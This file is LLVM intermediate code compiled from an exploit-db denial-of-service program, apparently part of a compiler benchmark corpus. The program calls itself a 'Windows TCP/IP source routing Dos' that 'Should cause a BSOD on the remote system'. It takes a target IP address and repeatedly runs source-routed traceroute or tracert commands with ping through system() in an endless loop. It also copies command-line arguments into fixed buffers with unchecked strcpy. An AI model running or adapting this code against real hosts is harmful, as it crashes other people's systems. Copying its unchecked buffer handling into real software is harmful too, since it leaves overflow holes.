; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1967.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1967.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [49 x i8] c"\0A\0AWindows TCP/IP source routing Dos - by Preddy\0A\00", align 1
@.str.1 = private unnamed_addr constant [27 x i8] c"Usage: %s <ip> <mysystem>\0A\00", align 1
@.str.2 = private unnamed_addr constant [29 x i8] c"Example: %s 127.0.0.1 linux\0A\00", align 1
@.str.3 = private unnamed_addr constant [57 x i8] c"Uses the ping and the traceroute utility on your system\0A\00", align 1
@.str.4 = private unnamed_addr constant [42 x i8] c"Should cause a BSOD on the remote system\0A\00", align 1
@.str.5 = private unnamed_addr constant [55 x i8] c"More info: http://www.security.nnov.ru/Fnews753.html\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"linux\00", align 1
@.str.7 = private unnamed_addr constant [13 x i8] c"\0ATarget: %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"MySystem: %s\0A\00", align 1
@.str.9 = private unnamed_addr constant [21 x i8] c"Sending Payload...\0A\0A\00", align 1
@.str.10 = private unnamed_addr constant [11 x i8] c"ping -c 1 \00", align 1
@.str.11 = private unnamed_addr constant [28 x i8] c"traceroute -m 1 -g 0.0.0.0 \00", align 1
@.str.12 = private unnamed_addr constant [8 x i8] c"windows\00", align 1
@.str.13 = private unnamed_addr constant [12 x i8] c"Target: %s\0A\00", align 1
@.str.14 = private unnamed_addr constant [20 x i8] c"Sending Payload...\0A\00", align 1
@.str.15 = private unnamed_addr constant [11 x i8] c"ping -n 1 \00", align 1
@.str.16 = private unnamed_addr constant [25 x i8] c"tracert -h 1 -j 0.0.0.0 \00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [255 x i8], align 16
  %6 = alloca [10 x i8], align 1
  %7 = alloca [21 x i8], align 16
  %8 = alloca [100 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %9 = load i32, i32* %3, align 4
  %10 = icmp ne i32 %9, 3
  br i1 %10, label %11, label %28

11:                                               ; preds = %2
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0))
  %13 = load i8**, i8*** %4, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i8* %15)
  %17 = load i8**, i8*** %4, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0), i8* %19)
  %21 = load i8**, i8*** %4, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.3, i64 0, i64 0), i8* %23)
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.4, i64 0, i64 0))
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.5, i64 0, i64 0))
  %27 = call i32 @exit(i32 1) #3
  unreachable

28:                                               ; preds = %2
  %29 = getelementptr inbounds [255 x i8], [255 x i8]* %5, i64 0, i64 0
  %30 = load i8**, i8*** %4, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @strcpy(i8* %29, i8* %32)
  %34 = getelementptr inbounds [10 x i8], [10 x i8]* %6, i64 0, i64 0
  %35 = load i8**, i8*** %4, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @strcpy(i8* %34, i8* %37)
  %39 = load i8**, i8*** %4, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 2
  %41 = load i8*, i8** %40, align 8
  %42 = call i64 @strcmp(i8* %41, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  %43 = icmp eq i64 %42, 0
  br i1 %43, label %44, label %69

44:                                               ; preds = %28
  %45 = getelementptr inbounds [255 x i8], [255 x i8]* %5, i64 0, i64 0
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.7, i64 0, i64 0), i8* %45)
  %47 = getelementptr inbounds [10 x i8], [10 x i8]* %6, i64 0, i64 0
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i64 0, i64 0), i8* %47)
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0))
  %50 = getelementptr inbounds [21 x i8], [21 x i8]* %7, i64 0, i64 0
  %51 = call i32 @strcpy(i8* %50, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.10, i64 0, i64 0))
  %52 = getelementptr inbounds [21 x i8], [21 x i8]* %7, i64 0, i64 0
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @strncat(i8* %52, i8* %55, i32 9)
  %57 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %58 = call i32 @strcpy(i8* %57, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0))
  %59 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %60 = load i8**, i8*** %4, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 1
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @strncat(i8* %59, i8* %62, i32 9)
  br label %64

64:                                               ; preds = %44, %64
  %65 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %66 = call i32 @system(i8* %65)
  %67 = getelementptr inbounds [21 x i8], [21 x i8]* %7, i64 0, i64 0
  %68 = call i32 @system(i8* %67)
  br label %64

69:                                               ; preds = %28
  %70 = load i8**, i8*** %4, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 2
  %72 = load i8*, i8** %71, align 8
  %73 = call i64 @strcmp(i8* %72, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.12, i64 0, i64 0))
  %74 = icmp eq i64 %73, 0
  br i1 %74, label %75, label %100

75:                                               ; preds = %69
  %76 = getelementptr inbounds [255 x i8], [255 x i8]* %5, i64 0, i64 0
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.13, i64 0, i64 0), i8* %76)
  %78 = getelementptr inbounds [10 x i8], [10 x i8]* %6, i64 0, i64 0
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i64 0, i64 0), i8* %78)
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.14, i64 0, i64 0))
  %81 = getelementptr inbounds [21 x i8], [21 x i8]* %7, i64 0, i64 0
  %82 = call i32 @strcpy(i8* %81, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.15, i64 0, i64 0))
  %83 = getelementptr inbounds [21 x i8], [21 x i8]* %7, i64 0, i64 0
  %84 = load i8**, i8*** %4, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @strncat(i8* %83, i8* %86, i32 9)
  %88 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %89 = call i32 @strcpy(i8* %88, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.16, i64 0, i64 0))
  %90 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %91 = load i8**, i8*** %4, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 1
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @strncat(i8* %90, i8* %93, i32 9)
  br label %95

95:                                               ; preds = %75, %95
  %96 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %97 = call i32 @system(i8* %96)
  %98 = getelementptr inbounds [21 x i8], [21 x i8]* %7, i64 0, i64 0
  %99 = call i32 @system(i8* %98)
  br label %95

100:                                              ; preds = %69
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i32 @strncat(i8*, i8*, i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
